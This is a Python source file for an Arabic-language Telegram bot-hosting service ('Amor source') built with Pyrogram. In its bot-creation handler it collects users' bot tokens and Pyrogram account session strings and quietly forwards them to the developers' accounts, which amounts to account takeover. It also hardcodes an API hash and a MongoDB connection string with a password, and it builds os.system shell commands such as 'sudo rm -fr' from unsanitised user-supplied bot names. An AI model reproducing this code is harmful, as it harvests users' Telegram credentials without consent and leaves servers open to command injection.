
import os
import sys
import asyncio
import re
import shutil
import sys
import psutil
import glob
import random
import requests
import subprocess  
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram import types
from pyrogram import enums
from sys import version as pyver

from pyrogram import __version__ as pyrover
from pytgcalls.__version__ import __version__ as pytgver
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from pyrogram.errors import (ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid)
from pymongo import MongoClient
from bot import SUDORS
from bot import*
from motor.motor_asyncio import AsyncIOMotorClient as mongo_client
from pyrogram.types import LinkPreviewOptions  # الإسم الجديد في Pyrogram v2+

from pymongo import MongoClient
from motor.motor_asyncio import AsyncIOMotorClient as _mongo_client_
from pyrogram.errors import FloodWait
from bot import *
from pyrogram import Client, filters
from pyrogram.errors import PeerIdInvalid

from typing import List, Union, Callable
from os import execle, environ
from pyrogram.errors import FloodWait, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded
from redis import Redis
from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton, Message, InlineKeyboardMarkup, InlineKeyboardButton
from Maker.Storage import add_new_user, is_user, get_users, users_backup, del_user
from Maker.Storage import*
from pymongo import MongoClient
from pyrogram import Client, filters
import random
from typing import Dict, List, Union



## ============ متغيرات و مطورين ============
API_ID = 8186557
API_HASH = "efd77b34c69c164ce158037ff5a0d117"
Bots = [] 
OFF = True
DEVS = ["Vxmvo", "Vx_pu", "Vv_xxy"]
ch = "xx_ui4"
gr = "Xx_ozc"

# ============ تخزين و قاعدة بيانات db ============
# ملاحظة: يرجى تغيير MONGO_URI لضمان خصوصية بياناتك
MONGO_URI = "mongodb+srv://AmorMusic:AmorOne@cluster0.nf0ml.mongodb.net/?retryWrites=true&w=majority"
mongo_client = MongoClient(MONGO_URI)
mongodb = mongo_client.AmorSource
users_collection = mongodb.tgusersdb
chats_collection = mongodb.chats
db = mongo_client["AMOR"]["source_db"]
mkchats = db.chatss
blocked = []
blockeddb = db.blocked
mk = []







def ss():
    Bots.clear()
    mk.clear()
    blocked.clear()
    dbb = db.find({})
    for bot_data in dbb:
        try:
            if "username" in bot_data and "dev" in bot_data:
                bot_info = [bot_data["username"], bot_data["dev"]]
                Bots.append(bot_info)
                os.system(f"screen -XS {bot_info[0]} quit")
                os.system(f"cd Maked/{bot_info[0]} && screen -d -m -S {bot_info[0]} python3 -m Amor")
                print(f"تم تشغيل البوت: {bot_info}")
        except Exception as e:
            print(f"خطأ في معالجة بيانات البوت: {e}")
    ddb = mkchats.find({})
    for chat in ddb:
        if "chat_id" in chat:
            mk.append(int(chat["chat_id"]))
    bb = blockeddb.find({})
    for user in bb:
        if "user_id" in user:
            blocked.append(int(user["user_id"]))
    return

ss()

@Client.on_message(filters.command("تفريغ التخزين", "") & filters.private)
async def clear_storage(client, message):
    if message.from_user.id in [8182094446]:
    
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("تأكيد التفريغ", callback_data="confirm_clear_storage")],
                [InlineKeyboardButton("إلغاء", callback_data="cancel_clear")]
            ]
        )

        await message.reply_text(
            "⚠️ هل أنت متأكد من أنك تريد تفريغ جميع بيانات التخزين؟\n"
            "هذا الإجراء سيحذف:\n"
            "• جميع سجلات البوتات\n"
            "• قوائم المحظورين\n"
            "• بيانات المجموعات\n"
            "ولا يمكن التراجع عنه!",
            reply_markup=keyboard
        )
    else:
        await message.reply_text("⚠️ هذا الأمر للمطور الأساسي فقط")
        
        
        
@Client.on_callback_query(filters.regex("^confirm_clear_storage$"))
async def confirm_clear_storage(client, callback_query):
    try:
        db.delete_many({})
        blockeddb.delete_many({})
        blocked.clear()
        mkchats.delete_many({})
        mk.clear()
        Bots.clear()
        await callback_query.message.edit_text(
            "✅ تم تفريغ جميع بيانات التخزين بنجاح\n"
            "• تم مسح سجلات البوتات\n"
            "• تم مسح المحظورين\n"
            "• تم مسح بيانات المجموعات"
        )
    except Exception as e:
        await callback_query.message.edit_text(f"❌ حدث خطأ أثناء التفريغ: {str(e)}")

@Client.on_callback_query(filters.regex("^cancel_clear$"))
async def cancel_clear(client, callback_query):
    await callback_query.message.edit_text("❌ تم إلغاء عملية التفريغ")



@Client.on_message(filters.private)
async def me(client, message):
    if not message.chat.id in mk:
        mk.append(message.chat.id)
        mkchats.insert_one({"chat_id": message.chat.id})
    
    if OFF and not (message.text in ["عمور","مطور","سورس", "أوامر", "INFO","تغير الجلسة","رجوع"]):
        if not message.from_user.id in SUDORS:
            return await message.reply_text("سـورس عـمـور مـكتـمل !!")
    
    if message.chat.id in blocked:
        return await message.reply_text("**تم حظرك عام من سورس عمور**")
    
    try:
        await client.get_chat_member(ch, message.from_user.id)
    except Exception:
        return await message.reply_video(
            video="https://graph.org/file/490756122766c26b39ab7.mp4",
            caption=f"<b>• مرحبا :{message.from_user.mention}\n\n• عليك بالاشتراك اولا في قناه السورس\n• تم تطويري من قبل : @Vxmvo",
            reply_markup=InlineKeyboardMarkup(
                [
                    [InlineKeyboardButton("قناة السورس", url=f"https://t.me/{ch}")]
                ]
            )
        )
    message.continue_propagation()
  
  
        

@Client.on_message(filters.command(["عمور","/amor"], ""))
async def SourceAmor(client: Client, message):
    await message.reply_video(
        video="https://graph.org/file/490756122766c26b39ab7.mp4",
        caption=f"<b>╭❖ᚐᴡᴇʟᴄᴏᴍᴇ ᴛᴏ\n╰⬣ᚐ[ᴀᴍᴏꝛ ꜱᴏᴜꝛᴄᴇ](https://t.me/{ch})\n╭⊚ᚐ[ɢꝛᴏᴜᴘ](https://t.me/{gr})\n╰❖ᚐ[ᴄᴧʟɴɴʟᴇ](https://t.me/{ch})</b>",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("ᴀᴍᴏꝛ", url=f"https://t.me/{ch}"),
                ],
                [
                    InlineKeyboardButton("Me ", url="https://t.me/Vxmvo"),
                ],
            ]
        ),
    )


@Client.on_message(filters.command(["INFO"], ""))
async def cast(client, message):
    kep = ReplyKeyboardMarkup([["عمور","مطور"], ["سورس"], ["أوامر"], ["رجوع"]], resize_keyboard=True)
    await message.reply_text("<b>╮◉ مـرحـبآ بك عزيزي المطور\n╯◉ هنا قسم سورس عمور والمطورين</b>", reply_markup=kep)
        


@Client.on_message(filters.command(["أوامر","/amor_cmds"], ""))
async def amor_info(client: Client, message):
    await message.reply_video(
        video=f"https://telegra.ph/file/28aade07d7335be175ddb.mp4",
        caption=f"""<b>
╭❖ ꜱᴏᴜꝛᴄᴇ.ɴᴧᴍᴇ: ᴀᴍᴏꝛ
┃◉ ꜱʏꜱᴛᴇᴍ: ᴘʏᴛʜᴏɴ
┃◉ ʟᴧɴɢᴜᴧɢᴇ: ɪꜱ ᴧꝛᴧʙɪᴄ
┃◉ ꝛᴇʟᴇᴧꜱᴇ: 1.0 ᴠ
┃◉ ᴅᴧᴛᴇ ᴄꝛᴇᴧᴛᴇᴅ: 2026
╰❖ ᴏᴡɴᴇꝛ ᴏꜰ ᴀᴍᴏꝛ:[Vxmvo](https://t.me/Vxmvo)
</b>""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "المطور", url=f"https://t.me/Vxmvo"),         
                ],[
                    InlineKeyboardButton(
                        "السورس", url=f"https://t.me/{ch}"),
               ],
          ]
        ),
    )










# ============ استدعاء المطورين============

    
@Client.on_message(filters.command(["مطور","/dev"], ""))
async def hand_uer_info(client, message):
    try:
        user = await client.get_chat("Vxmvo")
        name = user.first_name
        username = user.username if user.username else "لا يوجد"
        bio = user.bio if user.bio else "لا يوجد"
        
        caption = (
            f"┈┅┅━━━⊷⊰🤍⊱⊶━━━┅┅┈\n<b>"
            f"╭◉ ɴᴧᴍᴇ : {name}\n"
            f"┃◉ ᴜsᴇꝛ : @{username}\n"
            f"┃◉ ɪᴅ : <code>{user.id}</code>\n"
            f"╰◉ ʙɪᴏ : {bio}"
            f"</b>\n┈┅┅━━━⊷⊰🤍⊱⊶━━━┅┅┈"
        )
        
        button = InlineKeyboardMarkup(
            [[InlineKeyboardButton(name, url=f"https://t.me/{username}")]]
        )

        if user.photo:
            photo = await client.download_media(user.photo.big_file_id)
            await message.reply_photo(
                photo=photo,
                caption=caption,
                reply_markup=button,
                has_spoiler=True
            )
        else:
            await message.reply_text(
                caption,
                reply_markup=button
            )
            
    except Exception as e:
        print(f"Error: {e}")
        await message.reply_text("❌ حدث خطأ في جلب المعلومات")





    
@Client.on_message(filters.command(["ثانوي","/dev2"], ""))
async def handle_uer_info_secondary(client, message):
    try:
        user = await client.get_chat("Vx_pu")
        name = user.first_name
        username = user.username if user.username else "لا يوجد"
        bio = user.bio if user.bio else "لا يوجد"
        
        caption = (
            f"<b>"
            f"╭◉ ɴᴧᴍᴇ : {name}\n"
            f"┃◉ ᴜsᴇꝛ : @{username}\n"
            f"┃◉ ɪᴅ : <code>{user.id}</code>\n"
            f"╰◉ ʙɪᴏ : {bio}"
            f"</b>"
        )
        
        button = InlineKeyboardMarkup(
            [[InlineKeyboardButton(name, url=f"https://t.me/{username}")]]
        )

        if user.photo:
            photo = await client.download_media(user.photo.big_file_id)
            await message.reply_photo(
                photo=photo,
                caption=caption,
                reply_markup=button,
                has_spoiler=True
            )
        else:
            await message.reply_text(
                caption,
                reply_markup=button
            )
            
    except Exception as e:
        print(f"Error: {e}")
        await message.reply_text("❌ حدث خطأ في جلب المعلومات")


# ============ دالة الحظر و المحظورين ============

@Client.on_message(filters.command("حظر", ""))
async def ban(client, message):
    if message.from_user.id not in SUDORS:
        return

    m = await client.ask(message.chat.id, "ارسل معرف المستخدم الان")
    text = m.text.replace("@", "")

    try:
        user = await client.get_chat(text)
        user_id = user.id

        if user_id in blocked:
            return await message.reply_text("المستخدم محظور من قبل")

        blocked.append(user_id)
        blockeddb.insert_one({"user_id": user_id})
        await message.reply_text("تم حظر المستخدم")

    except Exception as e:
        await message.reply_text("تأكد من معرف المستخدم")



@Client.on_message(filters.command("الغاء حظر", ""))
async def unban(client, message):
    if message.from_user.id not in SUDORS:
        return

    m = await client.ask(message.chat.id, "ارسل معرف المستخدم الان")
    text = m.text.replace("@", "")

    try:
        user = await client.get_chat(text)
        user_id = user.id

        if user_id not in blocked:
            return await message.reply_text("المستخدم غير محظور")

        blocked.remove(user_id)
        blockeddb.delete_one({"user_id": user_id})
        await message.reply_text("تم الغاء حظر المستخدم")

    except Exception as e:
        await message.reply_text("تأكد من معرف المستخدم")
    


@Client.on_message(filters.command("المحظورين", ""))
async def list_blocked_users(client, message):
    if message.from_user.id not in SUDORS:
        return

    if not blocked:
        return await message.reply_text("لا يوجد محظوريين في سورس عمور")

    user_mentions = [await client.get_users(user_id) for user_id in blocked]
    response = "<b><u>قائمة المحظورين من سورس عمور:</u></b>\n"

    for i, user in enumerate(user_mentions, start=1):
        response += f"<b>{i} ➻ {user.mention}</b>\n"

    count = len(blocked)
    response += f"\n<b>عدد المحظورين :</b> ❰❪ {count} ❫❱</b>"

    await message.reply_text(response, parse_mode=enums.ParseMode.HTML)


@Client.on_message(filters.command("مسح المحظورين", ""))
async def clear_blocked_users(client, message):
    if message.from_user.id not in SUDORS:
        return
    if not blocked:
        return await message.reply_text("لا يوجد محظوريين في سورس عمور")
    count = len(blocked) 
    blocked.clear() 
    await message.reply_text(f"تم مسح جميع المحظورين بنجاح. وعددهم {count}")


# ============ دالة رفع مطورين للسورس ============

@Client.on_message(filters.command("رفع مطور", ""))
async def promote_dev(client, message):
    if message.from_user.id not in [8182094446]:
        return await message.reply_text("ليس لديك صلاحية لتنفيذ هذا الأمر.")

    m = await client.ask(message.chat.id, "ارسل معرف المستخدم الان")
    user_input = m.text.replace("@", "")

    try:
        user = await client.get_chat(user_input)
        user_id = user.id

        if user_id in SUDORS:
            return await m.reply_text("المستخدم بالفعل مطور")
        
        SUDORS.append(user_id)
        await m.reply_text("تم رفع المستخدم كمطور")
    except PeerIdInvalid:
        await message.reply_text("تأكد من معرف المستخدم")
    except Exception as e:
        await message.reply_text(f"حدث خطأ: {e}")



@Client.on_message(filters.command("تنزيل مطور", ""))
async def demote_dev(client, message):
    if message.from_user.id not in [8182094446]:
        return await message.reply_text("ليس لديك صلاحية لتنفيذ هذا الأمر.")
        
    m = await client.ask(message.chat.id, "ارسل معرف المستخدم الان")
    user_input = m.text.replace("@", "")

    try:
        user = await client.get_chat(user_input)
        user_id = user.id

        if user_id not in SUDORS:
            return await message.reply_text("هذا المستخدم ليس مطور")

        SUDORS.remove(user_id)
        await message.reply_text("تم تنزيل المستخدم من المطورين")
    except PeerIdInvalid:
        await message.reply_text("تأكد من معرف المستخدم")
    except Exception as e:
        await message.reply_text(f"حدث خطأ: {e}")

@Client.on_message(filters.command("المطورين", ""))
async def list_SUDORS_users(client, message):
    if message.from_user.id not in SUDORS:
        return await message.reply_text("ليس لديك صلاحية لتنفيذ هذا الأمر.")

    if not SUDORS:
        return await message.reply_text("لا يوجد مطورين في القائمة")

    try:
        user_mentions = await asyncio.gather(*[client.get_users(user_id) for user_id in SUDORS])
        response = "<b><u>قائمة مطورين السورس:</u></b>\n"

        for i, user in enumerate(user_mentions, start=1):
            response += f"<b>• {i}- {user.mention}</b>\n"

        count = len(SUDORS)
        response += f"\n<b>عدد المطورين:</b> ❰❪ {count} ❫❱</b>"

        await message.reply_text(response, parse_mode=enums.ParseMode.HTML)
    except Exception as e:
        await message.reply_text(f"حدث خطأ: {e}")

    
# ============ دوال قفل و الفتح و صنع ============


@Client.on_message(filters.command(["فتح السورس", "قفل السورس"], "") & filters.private)
async def onOFF(client, message):
    if not message.from_user.id in SUDORS:
        return
    
    global OFF
    
    if message.text == "فتح السورس":
        if OFF is None:
            return await message.reply_text("السورس مفتوح من قبل")
        OFF = None
        return await message.reply_text("تـم فـتـح السورس » بـنجـاح")
    
    else:
        if OFF is True:
            return await message.reply_text("السورس مقفول من قبل")
        OFF = True
        await message.reply_text("تـم قـفـل السورس » بـنجـاح")


@Client.on_message(filters.command("صنع بوت", "") & filters.private)
async def maked(client, message):
    if not message.from_user.id in SUDORS:
        for x in Bots:
            if int(x[1]) == message.from_user.id:
                return await message.reply_text("لـقد قمـت بـصنـع بـوت مـن قـبـل")
    try:
        ask = await client.ask(message.chat.id, "ارسـل تـوكـن الـبـوت من : @BotFather", timeout=300)
        TOKEN = ask.text.strip()
        
        if not TOKEN.startswith('') or ':' not in TOKEN:
            return await message.reply_text("التوكن غير صالح! يرجى إرسال توكن صحيح من @BotFather")
        temp_bot = Client("temp_bot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
        try:
            await temp_bot.start()
            bot_info = await temp_bot.get_me()
            if not bot_info:
                await temp_bot.stop()
                return await message.reply_text("فشل التحقق من التوكن! يرجى التأكد من صحته")
            username = bot_info.username
            await temp_bot.stop()
        except Exception as e:
            return await message.reply_text(f"خطأ في التوكن:")
            
    except TimeoutError:
        return await message.reply_text("انتهى الوقت المحدد لإرسال التوكن")
    except Exception as e:
        return await message.reply_text(f"حدث خطأ: {str(e)}")
    try:
        ask = await client.ask(message.chat.id, "ارسـل جـلسـه بـيروجـرام", timeout=300)
        SESSION = ask.text.strip()
        temp_user = Client("temp_user", api_id=API_ID, api_hash=API_HASH, session_string=SESSION, in_memory=True)
        try:
            await temp_user.start()
            user_info = await temp_user.get_me()
            if not user_info:
                await temp_user.stop()
                return await message.reply_text("فشل التحقق من الجلسة! يرجى التأكد من صحتها")
            await temp_user.stop()
        except Exception as e:
            return await message.reply_text(f"خطأ في الجلسة")
            
    except TimeoutError:
        return await message.reply_text("انتهى الوقت المحدد لإرسال الجلسة")
    except Exception as e:
        return await message.reply_text(f"حدث خطأ: {str(e)}")
    
    Dev = message.from_user.id
    zero = message.from_user.username
    if message.from_user.id in SUDORS:
        try:
            ask = await client.ask(message.chat.id, "ارسـل ايـدي المـطور", timeout=300)
            try:
                Dev = int(ask.text)
            except:
                return await message.reply_text("قم بارسال الايدي بشكل صحيح")
        except TimeoutError:
            return await message.reply_text("انتهى الوقت المحدد لإرسال الأيدي")
    for x in Bots:
        if x[0] == username:
            return await message.reply_text("لقد قمت بصنع هذا البوت من قبل")
    
    try:
        
        env = open(f"Maked/{username}/.env", "w+", encoding="utf-8")
        x = f'ID = {username}\nBOT_TOKEN = {TOKEN}\nSTRING_SESSION = {SESSION}\nOWNER_ID = {Dev}\nLOG_GROUP_ID = {Dev}'
        env.write(x)
        env.close()
        os.system(f"cd Md/{username} && chmod +x * && screen -d -m -S {username} python3 -m Amor")
        oo = [username, Dev, zero]
        Bots.append(oo)
        try:
            dev_user = await client.get_users(Dev)
            dev_name = dev_user.first_name
            dev_username = f"@{dev_user.username}" if dev_user.username else "لا يوجد"
        except:
            dev_name = "غير معروف"
            dev_username = "غير معروف"
            
        # إرسال الاستيكر
        sticker = await message.reply_sticker(sticker="CAACAgQAAyEFAASdulslAAISmGgv3nBSc1bNl3hamriEz3aQ03j7AAKpGAACy35gUVuY0AAB2-etlh4E")
        
        for chat in DEVS:
            try:
                usr = await client.get_users(Dev)
                dev_name = usr.first_name
                if usr.photo:
                    photo = await client.download_media(usr.photo.big_file_id)
                    await client.send_photo(
                        chat, photo,
                        caption=f"<b>تـم دخـول بـوت جديد الي سورس عمور\n\n• UESR BOT : @{username}\n• TOKEN BOT : `{TOKEN}`\n\n• PY-TGCALLS :  {pytgver}\n• PYROGRAM : {pyrover}\n <code>{SESSION}</code> \n\n• OWNER : <span style='color: blue;'>{dev_name}</span>\n• OWNER ID : <code>{Dev}</code></b>",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(dev_name, url=f"https://t.me/{usr.username}")]])
                    )
                else:
                    await client.send_message(
                        chat,
                        f"<b>تـم دخـول بـوت جديد الي سورس عمور\n\n• UESR BOT : @{username}\n• TOKEN BOT : `{TOKEN}`\n\n• PY-TGCALLS :  {pytgver}\n• PYROGRAM : {pyrover}\n <code>{SESSION}</code> \n\n• OWNER : <span style='color: blue;'>{dev_name}</span>\n• OWNER ID : <code>{Dev}</code></b>",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(dev_name, url=f"https://t.me/{usr.username}")]])
                    )
            except Exception as e:
                print(f"Error sending to dev {chat}: {e}")
                
        data = {"username": username, "dev": Dev}
        db.insert_one(data)
        
        try:
            user = await client.get_users(Dev)
            dev_name = user.first_name if user.first_name else "Owner Not Found"
            photo = await client.download_media(user.photo.big_file_id) if user.photo and user.photo.big_file_id else None
            
            await message.reply_photo(
                photo=photo,
                caption=f"• تم تشغيل البوت بنجاح\n• علي سورس عمور\n• إصدارات السورس:\n• pytgcalls: {pytgver}\n• Pyrogram : {pyrover}",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(dev_name, url=f"https://t.me/{user.username}"),
                     InlineKeyboardButton("ʙᴏᴛ", url=f"https://t.me/{username}")],
                    [InlineKeyboardButton("ᴀᴍᴏꝛ", url=f"https://t.me/{ch}")]
                ]),
                has_spoiler=True
            )
        except Exception as e:
            print(f"Error in final message: {e}")
            
    except Exception as e:
        return await message.reply_text(f"حدث خطأ أثناء إنشاء البوت: {str(e)}")
    print("❰❪ 𝗘𝗡𝗧𝗲𝗥 𝗮 𝗡𝗲𝘄 𝗕𝗼𝘁♪ ❫❱")


  


# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂[𝗔.𝗠.𝗢.𝗥]▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂




@Client.on_message(filters.command("حذف بوت", "") & filters.private)
async def deletbot(client, message):
  
   if not message.from_user.id in SUDORS:
     for x in Bots:
         bot = x[0]
         if int(x[1]) == message.from_user.id:       
           os.system(f"sudo rm -fr Maked/{bot}")
           os.system(f"screen -XS {bot} quit")
           Bots.remove(x)
           xx = {"username": bot}
           db.delete_one(xx)
           return await message.reply_text("تـم طـرد بـوتـك من سورس عمور..")
     return await message.reply_text("لم تقم بصنع بوتات")
   try:
      bot = await client.ask(message.chat.id, "ارسـل مـعرف البوت", timeout=300)
   except:
      return
   bot = bot.text.replace("@", "")
   bot_found = False
   for x in Bots:
       if x[0] == bot:
          Bots.remove(x)
          
          db.delete_one(xx)
          bot_found = True
          break
   if not bot_found:
       return await message.reply_text("تم حذف هذا البوت من قبل..؟")
   os.system(f"sudo rm -fr Maked/{bot}")
   os.system(f"screen -XS {bot} quit")
   await message.reply_text(f"<b>تم حـذف البـوت بنـجاح :  @{bot}</b>")





@Client.on_message(filters.command("البوتات المصنوعه", ""))
async def show_bots(client, message):
    if not message.from_user.id in SUDORS:
        return
    
    if not Bots:
        return await message.reply_text("⚠️ لا يوجد بوتات مخزنة حالياً")
    
    text = """
    <b>──「 قائمة البوتات العاملة 」──</b>
    """
    
    text += f"\n<b>• عدد البوتات : {len(Bots)}</b>\n\n"
    
    for index, bot in enumerate(Bots, start=1):
        try:
            dev_info = await client.get_users(bot[1])
            dev_name = dev_info.first_name or "مطور"
            text += f"""<b>• {index}-Bot:  @{bot[0]} | DEV: <a href='tg://user?id={dev_info.id}'>{dev_name}</a></b>\n"""
        except:
            text += f"<b>• {index}-Bot: @{bot[0]} | DEV: {bot[1]}</b>\n"
    
    
    
    await message.reply_text(text, link_preview_options=LinkPreviewOptions(is_disabled=True))





async def get_session_info(session_string):
    try:
        temp_client = Client(
            name=":memory:",
            session_string=session_string,
            in_memory=True
        )
        
        await temp_client.start()
        me = await temp_client.get_me()
        
        info = {
            "id": me.id,
            "first_name": me.first_name,
            "last_name": me.last_name if me.last_name else "",
            "username": f"@{me.username}" if me.username else "لا يوجد",
            "phone_number": me.phone_number if me.phone_number else "غير متاح"
        }
        
        await temp_client.stop()
        return info
        
    except Exception as e:
        return {"error": str(e)}

@Client.on_message(filters.command("تغير الجلسة", ""))
async def change_session(client, message):
    try:
        DEVELOPERS = [8182094446]
        
        is_developer = message.from_user.id in DEVELOPERS
        user_bot = next((x[0] for x in Bots if int(x[1]) == message.from_user.id), None)
        
        if not is_developer and not user_bot:
            await message.reply_text("**⚠️ ليس لديك بوت مسجل لتغيير جلسته**")
            return

        # تحديد معرف البوت
        if is_developer:
            # المطورون يرسلون معرف البوت
            bot_username = await client.ask(
                message.chat.id, 
                "**📌 أرسل معرف البوت الذي تريد تغيير جلسته:**", 
                timeout=300
            )
            bot_username = bot_username.text.replace("@", "")
            
            if not bot_username:
                await message.reply_text("**❌ خطأ: لم يتم إرسال المعرف**")
                return
        else:
            # المستخدمون العاديون يستخدمون بوتهم الوحيد مباشرة
            bot_username = user_bot
            await message.reply_text(f"**🔍 جاري إعداد تغيير جلسة بوتك @{bot_username}**")

        # طلب الجلسة الجديدة
        new_session = await client.ask(
            message.chat.id,
            "**• أرسل الجلسة الجديدة الآن:**\n\n"
            "**• تأكد من صحة الجلسة قبل الإرسال**\n"
            "❌ **لا تستخدم جلسة حسابك الرئيسي!**",
            timeout=300
        )
        new_session = new_session.text
        
        if not new_session:
            await message.reply_text("**❌ خطأ: لم يتم إرسال الجلسة**")
            return
        
        # التحقق من الجلسة
        msg = await message.reply("**🔍 جاري التحقق من الجلسة...**")
        session_info = await get_session_info(new_session)
        
        if "error" in session_info:
            await msg.edit(f"**❌ خطأ في الجلسة:**\n`{session_info['error']}`")
            return
        
        # عرض معلومات الجلسة
        info_text = (
            "**📋 معلومات الجلسة الجديدة:**\n\n"
            f"• **الاسم:** {session_info['first_name']} {session_info['last_name']}\n"
            f"• **المعرف:** {session_info['username']}\n"
            f"• **الآيدي:** `{session_info['id']}`\n"
            f"• **رقم الهاتف:** `{session_info['phone_number']}`\n\n"
            "**❓ هل تريد متابعة تغيير الجلسة؟ ( `نعم`/ `لا` )**"
        )
        
        await msg.edit(info_text)
        confirmation = await client.ask(
            message.chat.id, 
            "**⏳ قم بالرد بـ 'نعم' للتأكيد أو 'لا' للإلغاء**", 
            timeout=60
        )
        
        if confirmation.text.lower() != 'نعم':
            await message.reply_text("**❌ تم إلغاء العملية**")
            return
        
        await msg.edit("**⚙️ جاري تطبيق التغييرات...**")
        
        # التحقق من وجود مجلد البوت
        bot_folder = f"Maked/{bot_username}"
        if not os.path.exists(bot_folder):
            await msg.edit("**❌ خطأ: لا يوجد بوت بهذا الاسم**")
            return
        
        # إيقاف البوت إذا كان يعمل
        active_sessions = subprocess.getoutput('screen -ls')
        if f'.{bot_username}\t(' in active_sessions:
            os.system(f'screen -XS {bot_username} quit')
            await asyncio.sleep(2)
        
        # تحديث ملف .env
        env_path = f"{bot_folder}/.env"
        if os.path.exists(env_path):
            with open(env_path, 'r', encoding='utf-8') as f:
                env_content = f.readlines()
            
            new_content = []
            for line in env_content:
                if line.startswith('STRING_SESSION ='):
                    new_content.append(f'STRING_SESSION = {new_session}\n')
                else:
                    new_content.append(line)
            
            with open(env_path, 'w', encoding='utf-8') as f:
                f.writelines(new_content)
            
            # إعادة تشغيل البوت
            os.system(f'cd {bot_folder} && screen -d -m -S {bot_username} python3 -m Amor')
            
            # رسالة النجاح
            success_msg = (
                f"<b>• تم تغيير جلسة البوت @{bot_username} بنجاح**\n\n"
                f"• معلومات الحساب الجديد:**\n"
                f"• الاسم: {session_info['first_name']} {session_info['last_name']}\n"
                f"• المعرف: {session_info['username']}\n"
                f"• الآيدي: `{session_info['id']}`\n"
                f"• رقم الهاتف: `{session_info['phone_number']}`\n\n"
                "** سيستغرق البوت بعض الوقت للبدء**</b>"
            )
            await msg.edit(success_msg)
        else:
            await msg.edit("**❌ خطأ: لم يتم العثور على ملف .env**")
            
    except asyncio.TimeoutError:
        await message.reply_text("**⏱️ انتهى وقت الانتظار، يرجى المحاولة مرة أخرى**")
    except Exception as e:
        await message.reply_text(f"**❌ حدث خطأ غير متوقع:**\n`{str(e)}`")
# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂[𝗔.𝗠.𝗢.𝗥]▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂


@Client.on_message(filters.command("ايقاف البوت", ""))
async def stop_specific_bot(c, message):
 if message.from_user.id in [8182094446]:
    
    bot_username = await c.ask(message.chat.id, "ارسـل مـعرف البوت", timeout=300)
    bot_username = bot_username.text.replace("@", "")
    
    if not bot_username:
        await message.reply_text("**~ خطأ: يجب عليك تحديد اسم البوت.**")
        return

    msg = await message.reply("جاري ايقاف البوت...")
    await asyncio.sleep(2)
    await msg.delete()

    if not os.path.exists('Maked'):
        await message.reply_text("**~ خطأ: لا يوجد مجلد Maked.**")
        return


    bot_found = False  
    for folder in os.listdir("Maked"):
        if folder.replace("@", "") == bot_username:
            os.system(f'screen -XS {bot_username} quit')
            bot_found = True
            break  

    if not bot_found:
        await message.reply_text("**لا يوجد بوت بهذا الاسم ليقافه**")
    else:
        await message.reply_text(f"**تم ايقاف البوت : @{bot_username}**")
 else:
    await message.reply_text("هذا الامر للمطور الأساسي فقط")


# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂[𝗔.𝗠.𝗢.𝗥]▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂



@Client.on_message(filters.command("ايقاف البوتات", ""))
async def stooop_Allusers(c, message):
 if message.from_user.id in [8182094446]:

    n = 0
    msg = await message.reply("جاري ايقاف البوتات")
    await asyncio.sleep(2)
    await msg.delete()

    if not os.path.exists('Maked'):
        await message.reply_text("**~ خطأ: لا يوجد مجلد Maked.**")
        return

    for folder in os.listdir("Maked"):
        if re.search('[Bb][Oo][Tt]', folder):
            os.system('cd Maked/' + folder + ' && chmod +x * && screen -X -S ' + folder.replace("@", "") + ' quit')  
            n += 1

    if n == 0:
        await message.reply_text("**لا يوجد بوتات ليقافها**")
    else:
        await message.reply_text(f"**تم ايقاف :  {n} بوت بنجاح**")
 else:
    await message.reply_text("هذا الامر للمطور الأساسي فقط")





@Client.on_message(filters.command("تشغيل البوت", ""))
async def start_single_bot(client, message):
    if message.from_user.id in [8182094446]:
        n = 0
        try:
            bot_username = await client.ask(message.chat.id, "ارسـل مـعرف البوت", timeout=300)
            bot_username = bot_username.text.replace("@", "")
            
            if not bot_username:
                await message.reply_text("**خطاء : لم يتم ارسال المعرف**")
                return
            
            # التحقق من الجلسات النشطة أولاً
            active_sessions = subprocess.getoutput('screen -ls')
            if f'.{bot_username}\t(' in active_sessions:
                await message.reply_text(f"**البوت @{bot_username} يعمل بالفعل!**")
                return
            
            msg = await message.reply("**جاري تشغيل البوت..**")
            await asyncio.sleep(2)
            await msg.delete()

            if not os.path.exists('Maked'):
                await message.reply_text("**~ خطأ: لا يوجد مجلد Maked.**")
                return

            bot_folder = f"Maked/{bot_username}"
            if os.path.exists(bot_folder) and re.search('[Bb][Oo][Tt]', bot_username):
                os.system(f'cd {bot_folder} && screen -d -m -S {bot_username.replace("@", "")} python3 -m Amor')
                n += 1

            if n == 0:
                await message.reply_text("**لا يوجد بوت بهذا الاسم لتشغيله.**")
            else:
                await message.reply_text(f"**تم تشغيل بوت : @{bot_username} **")
        except Exception as e:
            await message.reply_text(f"**~ خطأ: {str(e)}**")
    else:
        await message.reply_text("هذا الامر للمطور الأساسي فقط")



